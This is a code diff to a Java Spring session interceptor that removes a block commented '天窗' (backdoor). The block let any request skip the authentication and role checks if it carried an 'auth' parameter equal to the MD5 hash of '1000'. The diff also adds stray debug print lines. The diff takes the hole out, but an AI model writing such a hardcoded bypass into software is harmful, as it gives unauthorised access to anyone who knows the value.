@@ -37,10 +37,6 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         Method method = handlerMethod.getMethod();
        System.out.println(method.getDefaultValue());
         
-       //天窗
-       if(MyDESutil.getMD5("1000").equals(request.getParameter("auth"))){
-          	return true;
-       }
        
         Account sessionAccount = null;
         Role sessionRole=null;
@@ -166,8 +162,10 @@ public class SessionControllerInterceptor implements HandlerInterceptor {
         	//超级管理员
         	if(sessionRole.getName().equals("超级管理员")
         			){
+        		System.out.println(2);
         		return true;
         	}
+        	System.out.println(3);
         	//admin中只许修改自己的值
         	if(sessionRole.getName().equals("用户")){
         		//角色全不许
